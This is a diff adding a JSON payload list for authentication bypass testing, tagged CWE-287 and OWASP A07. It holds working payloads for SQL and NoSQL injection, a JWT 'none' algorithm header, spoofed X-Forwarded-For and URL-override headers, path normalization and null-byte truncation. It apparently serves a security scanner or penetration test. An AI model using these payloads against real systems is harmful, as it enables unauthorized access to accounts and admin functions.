@@ -1,0 +1,18 @@
+{
+  "category": "Authentication & Authorization Bypass",
+  "cwe": "CWE-287",
+  "owasp": "A07:2021-Identification and Authentication Failures",
+  "description": "Standard OWASP & SecLists Authentication Bypass vectors for headers, token manipulation, and logic flaws.",
+  "vectors": [
+    { "id": "AUTH-001", "name": "SQLi Always True Admin", "payload": "admin' --", "mechanism": "sqli", "risk": "critical" },
+    { "id": "AUTH-002", "name": "SQLi OR 1=1 Double Quote", "payload": "\" OR \"\"=\"", "mechanism": "sqli", "risk": "critical" },
+    { "id": "AUTH-003", "name": "NoSQL Operator Injection Object", "payload": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}", "mechanism": "nosql", "risk": "critical" },
+    { "id": "AUTH-004", "name": "NoSQL Greater-Than Operator", "payload": "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "mechanism": "nosql", "risk": "critical" },
+    { "id": "AUTH-005", "name": "JWT None Algorithm Header", "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0", "mechanism": "jwt_algo_none", "risk": "critical" },
+    { "id": "AUTH-006", "name": "X-Forwarded-For Internal Origin", "payload": "X-Forwarded-For: 127.0.0.1", "mechanism": "header_spoofing", "risk": "high" },
+    { "id": "AUTH-007", "name": "X-Original-URL Route Override", "payload": "X-Original-URL: /admin/dashboard", "mechanism": "header_override", "risk": "high" },
+    { "id": "AUTH-008", "name": "X-Rewrite-URL Path Manipulation", "payload": "X-Rewrite-URL: /api/v1/admin/users", "mechanism": "header_override", "risk": "high" },
+    { "id": "AUTH-009", "name": "Path Normalization Semicolon", "payload": "/admin/..;/users", "mechanism": "path_normalization", "risk": "high" },
+    { "id": "AUTH-010", "name": "Null Byte User Truncation", "payload": "admin%00@target.local", "mechanism": "null_byte", "risk": "medium" }
+  ]
+}
